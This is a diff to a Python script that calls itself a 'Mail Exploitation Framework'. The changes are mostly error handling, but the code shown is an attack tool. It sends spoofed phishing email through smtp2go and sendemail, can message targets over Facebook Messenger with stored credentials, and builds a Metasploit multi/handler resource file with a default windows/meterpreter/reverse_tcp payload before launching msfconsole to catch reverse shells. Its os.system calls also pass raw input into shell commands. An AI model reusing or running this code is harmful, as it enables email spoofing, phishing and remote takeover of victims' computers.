@@ -46,7 +46,8 @@ def banner ():
 .||     ||. `|..||. .||. .||.     |...|'  ||..|' .||. `|..|' .||.   `|..'
                                           ||                             
                                          .||                             
-                                               
+                                              
+			 Mail Exploitation Framwork 
 				   v1.1                                                                        
 """, color='red')
 
@@ -100,47 +101,52 @@ def setup ():
 	# Check if the message is greater than 10 characters
 	if len(message) >= 10:
 		
-		fb = raw_input("Did you want to send to facebook messenger: [Y/n] ")
-		if fb == 'No' or fb == 'n' or fb == 'no':
-			
-			global isUsingMessenger
+		try:
 
-			if (enabledSpoofing == 'True'):
+			fb = raw_input("Did you want to send to facebook messenger: [Y/n] ")
+			if fb == 'No' or fb == 'n' or fb == 'no':
 				
+				global isUsingMessenger
 
-				color_print("[+] Email spoofing enabled", color='green')
+				if (enabledSpoofing == 'True'):
+					
 
+					color_print("[+] Email spoofing enabled", color='green')
+
+					# Validate the input.
+					if (goodByeName == 'None' or targetEmail == 'None' or spoofEmail == 'None' or smtpEmail == 'None' or smtpPass == 'None' or smtpGoServer == 'None'):
+						color_print('[!] Please setup your config file. make sure you create an account at https://www.smtp2go.com', color='red')	
+						return
+					else:
+						# Connects to the server.
+						isUsingMessenger = False
+						sendMail(smtpGoServer, targetEmail, spoofEmail, smtpGoEmail, smtpGoPass, subject, message, goodByeName)
+
+				else:
+
+				
+					color_print("[+] Email spoofing false", color='red')
+
+					# Validate the input.
+					if (goodByeName == 'None' or targetEmail == 'None' or spoofEmail == 'None' or smtpEmail == 'None' or smtpPass == 'None' or smtpServer == 'None' or smtpPort == 'None'):
+						color_print('[!] Please setup your config file', color='red')	
+						return
+					else:
+						# Connects to the server.
+						isUsingMessenger = False
+						sendMail(smtpServer, targetEmail, smtpEmail, smtpEmail, smtpPass, subject, message, goodByeName)
+			else:
 				# Validate the input.
-				if (goodByeName == 'None' or targetEmail == 'None' or spoofEmail == 'None' or smtpEmail == 'None' or smtpPass == 'None' or smtpGoServer == 'None'):
-					color_print('[!] Please setup your config file. make sure you create an account at https://www.smtp2go.com', color='red')	
+				if (fbusername == 'None' or fbpassword == 'None' or fbmessage == 'None' or fbuserID == 'None'):
+					color_print('[!] Please setup your config file.', color='red')	
 					return
 				else:
-					# Connects to the server.
-					isUsingMessenger = False
-					sendMail(smtpGoServer, targetEmail, spoofEmail, smtpGoEmail, smtpGoPass, subject, message, goodByeName)
+					isUsingMessenger = True
+					sendToMessenger()
 
-			else:
-
-			
-				color_print("[+] Email spoofing false", color='red')
-
-				# Validate the input.
-				if (goodByeName == 'None' or targetEmail == 'None' or spoofEmail == 'None' or smtpEmail == 'None' or smtpPass == 'None' or smtpServer == 'None' or smtpPort == 'None'):
-					color_print('[!] Please setup your config file', color='red')	
-					return
-				else:
-					# Connects to the server.
-					isUsingMessenger = False
-					sendMail(smtpServer, targetEmail, smtpEmail, smtpEmail, smtpPass, subject, message, goodByeName)
-		else:
-			# Validate the input.
-			if (fbusername == 'None' or fbpassword == 'None' or fbmessage == 'None' or fbuserID == 'None'):
-				color_print('[!] Please setup your config file.', color='red')	
-				return
-			else:
-				isUsingMessenger = True
-				sendToMessenger()
-
+		except KeyboardInterrupt:
+			color_print("\nThanks, Happy hacking", color='blue')
+			return
 	else:
 		color_print("[!] Please type in a longer message", color='red')
 		return
@@ -185,7 +191,7 @@ def sendToMessenger():
 			color_print("[!] No User found", color='red')
 			return
 	except IndexError:
-		color_print("[!] Something bad happended :(", color='red')
+		color_print("\n[!] Something bad happended :(", color='red')
 		return
 #
 # Connects to the smtp server.
@@ -237,7 +243,8 @@ def sendMail(server, toAddr, address, username, password, subject, message, good
 				os.system("sendemail -f " + address + " -t " + toAddr + " -u " + subject + " -o message-content-type=html -o message-file=message.html " + " -xu " + username + " -xp " + password + " -s " + server)		
 				listenForConnections()
 		except KeyboardInterrupt:
-			color_print("Thanks, Happy hacking", color='blue')
+			color_print("\nThanks, Happy hacking", color='blue')
+			return
 
 	except socket.gaierror:
 		# Failed to connect!!.
@@ -282,37 +289,44 @@ def getLink ():
 #		
 def listenForConnections ():
 # Do you want to listen for any connections.
-	listen = raw_input('Do you want to start up a listener: [Y/N]: ')
-	if listen == 'Y' or listen == 'y' or listen == 'yes' or listen == 'Yes':	
-		color_print("[+] Starting a listener", color='blue')
 
-		# Listen for a connection
+	try:
 
-		lhost = raw_input('What is your LHOST (local ip address): ')
-		lport = raw_input('What is your LPORT (port): ')
-		payload = raw_input('What is your payload: (eg windows/meterpreter/reverse_tcp): ')
-		if payload == '':
-			payload = 'windows/meterpreter/reverse_tcp'
+		listen = raw_input('Do you want to start up a listener: [Y/N]: ')
+		if listen == 'Y' or listen == 'y' or listen == 'yes' or listen == 'Yes':	
+			color_print("[+] Starting a listener", color='blue')
 
-		if os.path.isfile('resource.rc'):
-			os.system('rm resource.rc')
-		os.system('touch resource.rc')
-		os.system('echo use exploit/multi/handler >> resource.rc')
-		os.system('echo set PAYLOAD ' + payload + ' >> resource.rc')
-		os.system('echo set LHOST ' + lhost + ' >> resource.rc') 
-		os.system('echo set LPORT ' + lport + ' >> resource.rc')
-		os.system('echo set ExitOnSession false >> resource.rc')
-		os.system('echo exploit -j -z >> resource.rc')
-		os.system('cat resource.rc')
-		os.system('msfconsole -r resource.rc')
-	else:
-		#color_print("[+] Generated a report..", color='green')
-		#if isUsingMessenger == False:
-		#	generateMailReport(fromAddr, toAddr, spoofName, subject, message, html)
-		#else:
-		#	generateMessengerReport(fbuser, fbuserID, fbmessage, link)
-		#color_print("\nThanks, Happy hacking", color='blue')
-		return	
+			# Listen for a connection
+
+			lhost = raw_input('What is your LHOST (local ip address): ')
+			lport = raw_input('What is your LPORT (port): ')
+			payload = raw_input('What is your payload: (eg windows/meterpreter/reverse_tcp): ')
+			if payload == '':
+				payload = 'windows/meterpreter/reverse_tcp'
+
+			if os.path.isfile('resource.rc'):
+				os.system('rm resource.rc')
+			os.system('touch resource.rc')
+			os.system('echo use exploit/multi/handler >> resource.rc')
+			os.system('echo set PAYLOAD ' + payload + ' >> resource.rc')
+			os.system('echo set LHOST ' + lhost + ' >> resource.rc') 
+			os.system('echo set LPORT ' + lport + ' >> resource.rc')
+			os.system('echo set ExitOnSession false >> resource.rc')
+			os.system('echo exploit -j -z >> resource.rc')
+			os.system('cat resource.rc')
+			os.system('msfconsole -r resource.rc')
+		else:
+			#color_print("[+] Generated a report..", color='green')
+			#if isUsingMessenger == False:
+			#	generateMailReport(fromAddr, toAddr, spoofName, subject, message, html)
+			#else:
+			#	generateMessengerReport(fbuser, fbuserID, fbmessage, link)
+			#color_print("\nThanks, Happy hacking", color='blue')
+			return	
+	except KeyboardInterrupt:
+		color_print("\nThanks, Happy hacking", color='blue')
+		return
+
 
 
 # Generate a html report
